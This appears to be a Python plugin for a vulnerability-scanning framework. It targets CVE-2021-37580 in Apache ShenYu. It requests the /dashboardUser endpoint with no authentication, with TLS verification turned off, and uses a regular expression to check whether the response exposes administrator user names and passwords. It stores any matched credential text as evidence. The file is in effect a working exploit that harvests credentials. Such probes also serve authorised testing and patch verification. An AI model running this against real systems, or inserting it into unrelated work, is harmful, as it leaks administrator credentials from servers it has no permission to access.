#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/dashboardUser'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'code.*?message.*?currentPage.*?totalPage.*?dataList.*?userName.*?password.*?',res.text,re.S):
      ret['huixian'] = re.search(r'userName.*?password.*?,',res.text,re.S)
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret